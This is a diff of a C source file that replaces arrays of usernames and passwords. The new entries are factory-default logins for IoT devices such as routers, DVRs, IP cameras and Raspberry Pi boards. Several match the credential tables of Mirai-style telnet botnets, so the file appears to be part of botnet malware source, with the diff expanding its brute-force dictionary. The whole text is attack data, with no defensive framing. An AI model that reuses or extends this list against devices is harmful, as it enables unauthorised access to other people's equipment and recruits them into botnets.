@@ -1,16 +1,18 @@
 #include <stddef.h>
 
 const char *usernames[] = {
-    "admin", "root", "user", "support", "ubnt", "tech", "mother", "superadmin",
-    "admin1234", "1111111", "default", "", NULL
-};
+"user", "service", "pi", "tech", 
+"guest", "cactiuser", "administrator", "888888", 
+"Administrator", "informix", "admin", 
+"supervisor", "admin1", "666666", 
+"root", "nagios", "support", "ubnt", "mother", NULL};
 
 const char *passwords[] = {
-    "admin", "klv123", "ikwb", "admin1234", "ubnt", "1111111", "Zte521", "12345",
-    "123456", "anko", "666666", "realtek", "root", "pass", "password",
-    "jvbzd", "xc3511", "1234", "system", "dreambox", "smcadmin", "klv1234",
-    "zlxx.", "tech", "fucker", "00000000", "supervisor", "vizxv", "1111",
-    "default", "guest", "meinsm", "xmhdipc", "54321", "service", "888888",
-    "juantech", "user", "hi3518", "support", "7ujMko0admin", "7ujMko0vizxv",
-    "superadmin", "", NULL
-};
+"admin", "root", "user", "123456", "password", "service", "dreambox", "xmhdipc", "hi3518", 
+"jvbzd", "realtek", "anko", "xc3511", "tech", 
+"guest", "7ujMko0admin", "admin1234", "meinsm", 
+"5up", "ikwb", "1111111", "system", "12345", "klv123", "00000000", 
+"cacti", "888888", "juantech", "1234", "synopass", "informix", "smcadmin", 
+"1111", "articon", "supervisor", "54321", "pass", "666666", "Zte521", 
+"klv1234", "default", "fucker", "nagiosxi", "nagios", "", 
+"zlxx.", "support", "XA1bac0MX", "ubnt", "7ujMko0vizxv", "vizxv", "rasberry", NULL};
